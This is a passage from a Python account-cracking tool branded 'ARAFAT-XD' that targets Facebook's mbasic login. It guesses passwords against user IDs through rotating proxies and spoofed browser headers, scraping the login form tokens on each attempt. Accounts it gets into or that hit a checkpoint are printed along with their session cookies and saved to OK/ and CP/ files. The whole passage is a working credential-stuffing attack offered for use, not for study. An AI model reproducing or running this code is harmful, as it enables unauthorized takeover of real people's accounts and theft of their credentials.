                print(f'\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━───\033[1;92m')
                os.system('espeak -a 300 "Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#------------------[ METHODE-MBASIC-2 ]-------------------#
 
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[ARAFAT-XD]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="120", "Google Chrome";v="117"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mARAFAT-CP🖤\033[1;91m] {idf} • {pw}')
                print(f'\033[38;5;196m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━──\033[1;37m')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                CP+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\r\x1b[38;5;50m\x1b[38;5;50m[\x1b[38;5;50mARAFAT-OK💙\x1b[38;5;50m] \x1b[38;5;50m\x1b[38;5;50m[\x1b[38;5;50m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\x1b[38;5;50m]= \033[1;93m{idf} \x1b[38;5;50m\x1b[38;5;50m[\x1b[38;5;50m𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿\x1b[38;5;50m]= \033[1;93m{pw}\n\x1b[38;5;50 \x1b[38;5;50m[𝘾𝙊𝙊𝙆𝙀𝙎=🌸]\x1b[38;5;50m\x1b[38;5;50m= \x1b[38;5;50m{kuki} ')
                print(f'\033[38;5;196m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━───\033[1;37m')
                os.system('espeak -a 300 "Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#-----------------------[ SYSTEM-CONTROL ]--------------------#
 
if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
    
    
    
menu()